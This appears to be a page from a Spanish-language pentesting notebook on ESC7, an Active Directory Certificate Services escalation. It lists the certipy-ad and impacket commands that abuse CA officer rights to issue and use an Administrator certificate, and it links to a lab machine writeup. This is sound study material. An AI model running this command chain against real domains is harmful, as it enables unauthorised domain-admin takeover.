@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>ESC7 | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="esc7">
+          <div class="note-tabbar">
+            <span>ESC7</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Active Directory/Escalada/ADCS</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">active directory / escalada / adcs</p>
+            <h2>ESC7</h2>
+
+            <p>ESC7 se centra en permisos peligrosos sobre la CA o sus roles, como ManageCA o ManageCertificates.</p>
+
+            <h2>Dangerous Permissions on CA</h2>
+            <p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca">ESC7 PoC</a></p>
+            <section class="code-card">
+              <h3>Agregar el rol Certificate Officer al propio usuario</h3>
+              <pre><code>certipy-ad ca -u &lt;user&gt;@&lt;dominio&gt; -p &lt;pass&gt; -ns &lt;ip_target&gt; -target &lt;hostname.dominio&gt; -ca &lt;ca_name&gt; -add-officer &lt;user&gt;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Habilitar plantilla SubCA</h3>
+              <pre><code>certipy-ad ca -u &lt;user&gt;@&lt;dominio&gt; -p &lt;pass&gt; -ns &lt;ip_target&gt; -target &lt;hostname.dominio&gt; -ca &lt;ca_name&gt; -enable-template &#x27;SubCA&#x27;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Kali: Enumerar SID del dominio</h3>
+              <pre><code># Impacket
+impacket-lookupsid &lt;user&gt;:&lt;pass&gt;@&lt;ip_dc&gt; | grep &quot;Domain SID&quot;
+# Netexec
+nxc ldap &lt;ip_dc&gt; -u &lt;user&gt; -p &lt;pass&gt; --get-sid</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Solicitar certificado para Administrator, si falla se crea una .key con un id</h3>
+              <pre><code>certipy-ad req -u &lt;user&gt;@&lt;dominio&gt; -p &lt;pass&gt; -dc-ip &lt;ip_target&gt; -target &lt;hostname.dominio&gt; -ca &lt;ca_name&gt; -template &#x27;SubCA&#x27; -upn administrator@&lt;dominio&gt; -sid &lt;domain_sid&gt;
+ # Guardar Request ID como &lt;id&gt;.key</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Aprobar la solicitud anterior a través de la &lt;id&gt;.key</h3>
+              <pre><code>certipy-ad ca -u &lt;user&gt;@&lt;dominio&gt; -p &lt;pass&gt; -ns &lt;ip_target&gt; -target &lt;hostname.dominio&gt; -ca &lt;ca_name&gt; -issue-request &lt;id&gt;
+# ID del paso 3</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Recuperar el certificado de Administrator</h3>
+              <pre><code>certipy-ad req -u &lt;user&gt;@&lt;dominio&gt; -p &lt;pass&gt; -dc-ip &lt;ip_target&gt; -target &lt;hostname.dominio&gt; -ca &lt;ca_name&gt; -retrieve &lt;id&gt;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Autenticarse con el Certificado .pfx</h3>
+              <pre><code>certipy-ad auth -pfx administrator.pfx -domain &lt;domain.local&gt; -dc-ip &lt;dc_ip&gt;</code></pre>
+            </section>
+
+            <h2>Relacionados</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=manager">Manager</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ad</span>
+              <span>active_directory</span>
+              <span>escalada</span>
+              <span>adcs</span>
+              <span>esc7</span>
+              <span>manageca</span>
+              <span>certipy</span>
+              <span>certificaciones</span>
+              <span>pfx</span>
+              <span>esc17</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
